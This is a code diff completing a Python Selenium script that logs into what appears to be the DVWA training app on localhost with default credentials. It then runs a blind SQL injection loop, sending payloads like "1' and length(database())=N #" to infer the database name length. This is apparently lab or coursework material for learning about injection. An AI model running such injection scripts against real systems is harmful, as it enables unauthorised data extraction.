@@ -12,22 +12,25 @@ def sqlinjection(host):
     s = Service(ChromeDriverManager().install())
     driver = webdriver.Chrome(service=s)
 
-    # driver.implicitly_wait(30)
+    #driver.implicitly_wait(30)
     driver.maximize_window()
-
+        
     # navigate to the application home page
-    # driver.get
-
+    driver.get(host+"/login.php")
+        
     # get the search textbox
-    username = driver.find_element("name", "username")
-    # password =
+    username = driver.find_element("name","username")
+    password=driver.find_element("name","password")
 
     # enter search keyword and submit
     username.send_keys("admin")
-    # password.
-    # login
+    password.send_keys("password")
+    login=driver.find_element("name","Login")
     time.sleep(timeToSleep)
     login.click()
+    
+    # creating a log file 
+    fp = open('sqloutput.log','w')
 
     # Run this if db has not init
     try:
@@ -39,25 +42,19 @@ def sqlinjection(host):
         login=driver.find_element("name","Login")
     except:
         print("DB has been already initialized")   
-        
-    # creating a log file
-    fp = open("sqloutput.log", "w")
-
-    # navigate to SQLI Blind page
-    # driver
-    # sucess_message =
-
+    
+    driver.get(host+"/vulnerabilities/sqli_blind/")
+    sucess_message = 'User ID exists in the database.'
     is_true = False
     db_size = 1
     while not is_true:
-        inputElement = driver.find_element("name", "id")
+        inputElement = driver.find_element("name","id")
         time.sleep(1)
-        # Send SQL attack query here
-        # inputElement.send_keys
+        inputElement.send_keys(f"1' and length(database())={db_size} #")
         time.sleep(1)
         inputElement.send_keys(Keys.ENTER)
         time.sleep(1)
-        elem = driver.find_element(By.CSS_SELECTOR, "pre")
+        elem = driver.find_element(By.CSS_SELECTOR, "pre")   
         if elem.text == sucess_message:
             is_true = True
         else:
@@ -68,6 +65,5 @@ def sqlinjection(host):
     fp.close()
     time.sleep(3)
     driver.close()
-
-
+    
 sqlinjection("http://localhost")
